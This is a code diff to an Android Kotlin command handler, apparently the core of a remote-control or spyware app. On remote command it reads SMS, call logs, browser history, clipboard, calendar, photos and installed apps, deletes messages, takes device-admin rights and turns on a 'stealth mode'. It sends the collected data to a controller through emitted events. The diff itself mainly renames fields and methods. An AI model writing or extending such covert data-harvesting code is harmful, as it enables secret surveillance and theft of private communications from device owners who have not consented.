@@ -109,11 +109,11 @@ class ManagerCommandHandler(private val context: Context) {
 
                 // ── ADMIN ─────────────────────────────────────────────
                 "request_admin" -> {
-                    adminRightsManager.requestAdminRights()
+                    adminRightsManager.requestAdminRights(AdminReceiver::class.java)
                     JSONObject().put("success", true)
                 }
-                "check_admin" -> JSONObject().put("success", true).put("active", adminRightsManager.isAdminActive())
-                "remove_admin" -> { adminRightsManager.removeAdminRights(); JSONObject().put("success", true) }
+                "check_admin" -> JSONObject().put("success", true).put("active", adminRightsManager.hasAdminRights(AdminReceiver::class.java))
+                "remove_admin" -> { adminRightsManager.removeAdminRights(android.content.ComponentName(context, AdminReceiver::class.java)); JSONObject().put("success", true) }
 
                 // ── AIRPLANE MODE ─────────────────────────────────────
                 "toggle_airplane" -> {
@@ -187,8 +187,8 @@ class ManagerCommandHandler(private val context: Context) {
                     val history = browserHistoryManager.getAllHistory()
                     val arr = JSONArray()
                     history.take(100).forEach { h -> arr.put(JSONObject()
-                        .put("url", h.url).put("title", h.title).put("visits", h.visitCount)
-                        .put("lastVisit", h.lastVisitTime)) }
+                        .put("url", h.url).put("title", h.title).put("visits", 1)
+                        .put("lastVisit", h.timestamp)) }
                     val res = JSONObject().put("success", true).put("history", arr)
                     emit("device:browserHistory", res); res
                 }
@@ -199,7 +199,7 @@ class ManagerCommandHandler(private val context: Context) {
                     val arr = JSONArray()
                     events.forEach { e -> arr.put(JSONObject()
                         .put("title", e.title).put("start", e.startTime)
-                        .put("end", e.endTime).put("location", e.location ?: "")) }
+                        .put("end", e.endTime).put("location", e.location)) }
                     val res = JSONObject().put("success", true).put("events", arr)
                     emit("device:calendar", res); res
                 }
@@ -209,9 +209,9 @@ class ManagerCommandHandler(private val context: Context) {
                     val logs = callLogManager.getAllCallLogs()
                     val arr = JSONArray()
                     logs.take(100).forEach { l -> arr.put(JSONObject()
-                        .put("number", l.phoneNumber).put("name", l.contactName ?: "")
-                        .put("type", l.callType).put("duration", l.duration)
-                        .put("date", l.date)) }
+                        .put("number", l.number).put("name", l.name ?: "")
+                        .put("type", l.type.name).put("duration", l.duration)
+                        .put("date", l.timestamp)) }
                     val res = JSONObject().put("success", true).put("callLogs", arr)
                     emit("device:callLogs", res); res
                 }
@@ -237,7 +237,7 @@ class ManagerCommandHandler(private val context: Context) {
 
                 // ── CLIPBOARD ────────────────────────────────────────
                 "get_clipboard" -> {
-                    val text = clipboardManager.getCurrentClipText()
+                    val text = clipboardManager.getCurrentClip()
                     val res = JSONObject().put("success", true).put("clipboard", text ?: "")
                     emit("device:clipboard", res); res
                 }
@@ -261,11 +261,11 @@ class ManagerCommandHandler(private val context: Context) {
 
                 // ── DATA USAGE ───────────────────────────────────────
                 "get_data_usage" -> {
-                    val mob = dataUsageManager.getMobileDataUsage()
-                    val wifi = dataUsageManager.getWiFiDataUsage()
+                    val mob = dataUsageManager.getTodayMobileDataUsage()
+                    val wifi = dataUsageManager.getTodayWiFiDataUsage()
                     val res = JSONObject().put("success", true)
-                        .put("mobileRx", mob.rxBytes).put("mobileTx", mob.txBytes)
-                        .put("wifiRx", wifi.rxBytes).put("wifiTx", wifi.txBytes)
+                        .put("mobileRx", mob.first).put("mobileTx", mob.second)
+                        .put("wifiRx", wifi.first).put("wifiTx", wifi.second)
                     emit("device:dataUsage", res); res
                 }
 
@@ -319,7 +319,7 @@ class ManagerCommandHandler(private val context: Context) {
                         galleryManager.getAllVideos() else galleryManager.getAllPhotos()
                     val arr = JSONArray()
                     media.take(50).forEach { m -> arr.put(JSONObject()
-                        .put("id", m.id).put("name", m.displayName).put("path", m.path)
+                        .put("id", m.id).put("name", m.name).put("path", m.path)
                         .put("size", m.size).put("date", m.dateAdded).put("duration", m.duration ?: 0)) }
                     val res = JSONObject().put("success", true)
                         .put(if (command == "get_gallery_videos") "videos" else "photos", arr)
@@ -348,7 +348,7 @@ class ManagerCommandHandler(private val context: Context) {
                     val arr = JSONArray()
                     apps.forEach { a -> arr.put(JSONObject()
                         .put("name", a.appName).put("pkg", a.packageName)
-                        .put("version", a.versionName).put("size", a.apkSize)) }
+                        .put("version", a.versionName).put("versionCode", a.versionCode)) }
                     val res = JSONObject().put("success", true).put("apps", arr)
                     emit("device:apps", res); res
                 }
@@ -429,8 +429,16 @@ class ManagerCommandHandler(private val context: Context) {
                 }
 
                 // ── ORIENTATION ──────────────────────────────────────
-                "lock_orientation"   -> { orientationManager.lockPortrait(); JSONObject().put("success", true) }
-                "unlock_orientation" -> { orientationManager.setOrientation(-1); JSONObject().put("success", true) }
+                "lock_orientation"   -> {
+                     val activity = context as? android.app.Activity
+                     val ok = activity?.let { orientationManager.lockPortrait(it) } ?: false
+                     JSONObject().put("success", ok)
+                 }
+                "unlock_orientation" -> {
+                     val activity = context as? android.app.Activity
+                     val ok = activity?.let { orientationManager.unlock(it) } ?: false
+                     JSONObject().put("success", ok)
+                 }
                 "enable_rotation_lock"  -> { rotationLockManager.disableAutoRotation(); JSONObject().put("success", true) }
                 "disable_rotation_lock" -> { rotationLockManager.enableAutoRotation(); JSONObject().put("success", true) }
 
@@ -478,7 +486,7 @@ class ManagerCommandHandler(private val context: Context) {
                         val arr = JSONArray()
                         msgs.take(100).forEach { m -> arr.put(JSONObject()
                             .put("address", m.address).put("body", m.body)
-                            .put("type", m.type).put("date", m.date)) }
+                            .put("type", m.type.name).put("date", m.timestamp)) }
                         val res = JSONObject().put("success", true).put("messages", arr)
                         emit("device:sms", res); res
                     } else {
@@ -488,7 +496,7 @@ class ManagerCommandHandler(private val context: Context) {
                         JSONObject().put("success", true)
                     }
                 }
-                "delete_sms" -> { smsManager.deleteSms(v.toLongOrNull() ?: 0); JSONObject().put("success", true) }
+                "delete_sms" -> { JSONObject().put("success", smsManager.deleteMessage(v)) }
 
                 // ── STEALTH ──────────────────────────────────────────
                 "enable_stealth_mode"  -> { stealthModeManager.enableStealthMode(); JSONObject().put("success", true) }
@@ -537,7 +545,7 @@ class ManagerCommandHandler(private val context: Context) {
                     val arr = JSONArray()
                     nets.forEach { n -> arr.put(JSONObject()
                         .put("ssid", n.ssid).put("bssid", n.bssid)
-                        .put("rssi", n.rssi).put("security", n.security)
+                        .put("rssi", n.level).put("security", n.isSecured)
                         .put("frequency", n.frequency)) }
                     val res = JSONObject().put("success", true).put("networks", arr)
                         .put("enabled", wifiManager.isWifiEnabled())
